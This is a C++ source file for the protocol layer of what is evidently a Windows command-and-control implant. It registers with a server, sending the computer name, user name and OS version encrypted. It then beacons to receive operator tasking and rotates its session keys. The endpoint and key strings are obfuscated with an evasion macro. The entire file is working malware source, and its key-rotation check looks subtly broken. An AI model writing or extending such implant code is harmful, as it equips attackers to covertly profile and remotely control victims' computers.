#include "Protocol.h"

#include "Base64.h"
#include "Config.h"
#include "Crypto.h"
#include "StageLog.h"
#include "Transport.h"
#include "evasive/Strings.h"
#include "transport/Profile.h"

#include <windows.h>
#include <bcrypt.h>

#include <cstring>
#include <sstream>

#pragma comment(lib, "bcrypt.lib")

namespace proto {

namespace {

std::string hn() {
    char b[256] = {};
    DWORD n = sizeof(b);
    GetComputerNameA(b, &n);
    return std::string(b);
}

std::string un() {
    char b[256] = {};
    DWORD n = sizeof(b);
    GetUserNameA(b, &n);
    return std::string(b);
}

std::string os() {
    OSVERSIONINFOA v{};
    v.dwOSVersionInfoSize = sizeof(v);
#pragma warning(suppress : 4996)
    GetVersionExA(&v);
    SYSTEM_INFO s{};
    GetNativeSystemInfo(&s);
    std::ostringstream r;
    r << "Windows " << v.dwMajorVersion << "." << v.dwMinorVersion
      << " build " << v.dwBuildNumber << " arch=" << s.wProcessorArchitecture;
    return r.str();
}

std::string rb(std::string_view n, std::string_view e) {
    return std::string("{\"nonce\":\"") + std::string(n) + "\",\"enc\":\"" + std::string(e) + "\"}";
}

std::string bb(std::string_view e) {
    return std::string("{\"enc\":\"") + std::string(e) + "\"}";
}

} // namespace

std::string json_string(std::string_view j, std::string_view k) {
    std::string p = "\"" + std::string(k) + "\"";
    auto x = j.find(p);
    if (x == std::string::npos) return {};
    auto c = j.find(':', x + p.size());
    if (c == std::string::npos) return {};
    auto q1 = j.find('"', c + 1);
    if (q1 == std::string::npos) return {};
    auto q2 = j.find('"', q1 + 1);
    if (q2 == std::string::npos) return {};
    std::string o;
    for (auto i = q1 + 1; i < q2; ++i) {
        if (j[i] == '\\' && i + 1 < q2) { ++i; continue; }
        o.push_back(j[i]);
    }
    return o;
}

std::string encrypt_payload(std::string_view p, const std::uint8_t k[32]) {
    return crypto::encrypt(p, k);
}

std::string encrypt_for_chunk(std::string_view, const std::uint8_t k[32],
                              std::string_view chunk_id, int seq, int total,
                              std::string_view chunk_data) {
    std::string e = crypto::encrypt(chunk_data, k);
    std::ostringstream os;
    os << "{\"chunk_id\":\"" << chunk_id << "\",\"seq\":" << seq
       << ",\"total\":" << total << ",\"enc\":\"" << e << "\"}";
    return os.str();
}

bool register_agent(std::string_view psk, Session& out) {
    std::string nh = crypto::random_nonce_hex();
    std::vector<std::uint8_t> nb(16);
    for (int i = 0; i < 16; ++i) {
        auto hb = [](char c) -> int {
            if (c >= '0' && c <= '9') return c - '0';
            if (c >= 'a' && c <= 'f') return c - 'a' + 10;
            return 0;
        };
        nb[i] = static_cast<std::uint8_t>((hb(nh[i * 2]) << 4) | hb(nh[i * 2 + 1]));
    }
    auto rk = crypto::derive_key(psk, nb.data(), nb.size());
    if (rk.size() != 32) { C2_STAGE("reg-derive-fail"); return false; }

    std::string pl = hn() + "|" + un() + "|" + os();
    std::string e = crypto::encrypt(pl, rk.data());
    if (e.empty()) { C2_STAGE("reg-encrypt-fail"); return false; }

    const std::string body = rb(nh, e);
    auto path_reg = OBF_KEEP("/register");
    auto k_agent = OBF_KEEP("agent_id");
    auto k_enc = OBF_KEEP("enc");
    for (int attempt = 0; attempt < 6; ++attempt) {
        auto* t = tx::active();
        if (!t) { C2_STAGE("reg-no-transport"); return false; }
        char tname[96];
        wsprintfA(tname, "reg-try-%s-%d", t->name(), attempt);
        C2_STAGE(tname);

        tx::Reply rp;
        if (!t->send(path_reg.c_str(), body, "", rp)) {
            char em[96];
            wsprintfA(em, "reg-send-fail-%d", GetLastError());
            C2_STAGE(em);
            tx::report_failure();
            Sleep(250);
            continue;
        }
        std::string id = json_string(rp.body, k_agent.c_str());
        std::string re = json_string(rp.body, k_enc.c_str());
        if (id.empty() || re.empty()) {
            char em[128];
            wsprintfA(em, "reg-bad-json-len-%d", static_cast<int>(rp.body.size()));
            C2_STAGE(em);
            tx::report_failure();
            Sleep(250);
            continue;
        }

        bool ok = false;
        std::string p = crypto::decrypt(re, rk.data(), &ok);
        if (!ok || p.find('|') == std::string::npos || p.substr(0, p.find('|')) != "OK") {
            C2_STAGE("reg-decrypt-fail");
            tx::report_failure();
            Sleep(250);
            continue;
        }

        std::vector<std::uint8_t> salt;
        salt.assign(id.begin(), id.end());
        salt.insert(salt.end(), nb.begin(), nb.end());
        auto sk = crypto::derive_key(psk, salt.data(), salt.size());
        if (sk.size() != 32) { C2_STAGE("reg-session-derive-fail"); return false; }

        tx::report_success();
        out.agent_id = id;
        out.session_key = std::move(sk);
        C2_STAGE("reg-ok");
        return true;
    }
    C2_STAGE("reg-exhausted");
    return false;
}

BeaconResult beacon_ex(std::string_view id, const std::uint8_t k[32], std::string_view ep) {
    BeaconResult out;
    auto* t = tx::active();
    if (!t) {
        out.status = BeaconStatus::TransportFail;
        return out;
    }
    tx::Reply rp;
    auto path_beacon = OBF_KEEP("/beacon");
    if (!t->send(path_beacon.c_str(), bb(ep), id, rp)) {
        tx::report_failure();
        out.status = BeaconStatus::TransportFail;
        return out;
    }
    // Plaintext status before decrypt (server restart / unknown agent).
    auto k_status = OBF_KEEP("status");
    auto k_error = OBF_KEEP("error");
    auto k_enc = OBF_KEEP("enc");
    auto v_ua = OBF_KEEP("unknown_agent");
    std::string st = json_string(rp.body, k_status.c_str());
    if (st == v_ua.c_str()) {
        tx::report_failure();
        out.status = BeaconStatus::UnknownAgent;
        return out;
    }
    std::string err = json_string(rp.body, k_error.c_str());
    if (err == "unknown agent" || err == v_ua.c_str()) {
        tx::report_failure();
        out.status = BeaconStatus::UnknownAgent;
        return out;
    }
    std::string re = json_string(rp.body, k_enc.c_str());
    if (re.empty()) {
        tx::report_failure();
        out.status = BeaconStatus::DecryptFail;
        return out;
    }
    bool ok = false;
    std::string p = crypto::decrypt(re, k, &ok);
    if (!ok) {
        tx::report_failure();
        out.status = BeaconStatus::DecryptFail;
        return out;
    }
    tx::report_success();
    out.status = BeaconStatus::Ok;
    out.payload = std::move(p);
    return out;
}

std::string beacon(std::string_view id, const std::uint8_t k[32], std::string_view ep) {
    auto r = beacon_ex(id, k, ep);
    if (r.status != BeaconStatus::Ok) return {};
    return r.payload;
}

bool rotate_key(std::string_view id, const std::uint8_t old_key[32], std::uint8_t new_key[32]) {
    // Generate 32 random bytes and base64-encode them.
    std::uint8_t rnd[32];
    if (!BCryptGenRandom(nullptr, rnd, sizeof(rnd), BCRYPT_USE_SYSTEM_PREFERRED_RNG)) return false;
    std::string b64 = b64::encode(rnd, sizeof(rnd));
    auto key_pfx = OBF_KEEP("KEY:");
    std::string plain = std::string(key_pfx.c_str()) + b64;
    std::string enc = crypto::encrypt(plain, old_key);
    tx::Reply rp;
    auto path_rk = OBF_KEEP("/rotate_key");
    if (!tx::active()->send(path_rk.c_str(), bb(enc), id, rp)) return false;
    auto k_enc = OBF_KEEP("enc");
    std::string re = json_string(rp.body, k_enc.c_str());
    if (re.empty()) return false;
    bool ok = false;
    std::string p = crypto::decrypt(re, old_key, &ok);
    if (!ok || p != "OK") return false;
    std::memcpy(new_key, rnd, 32);
    return true;
}

} // namespace proto
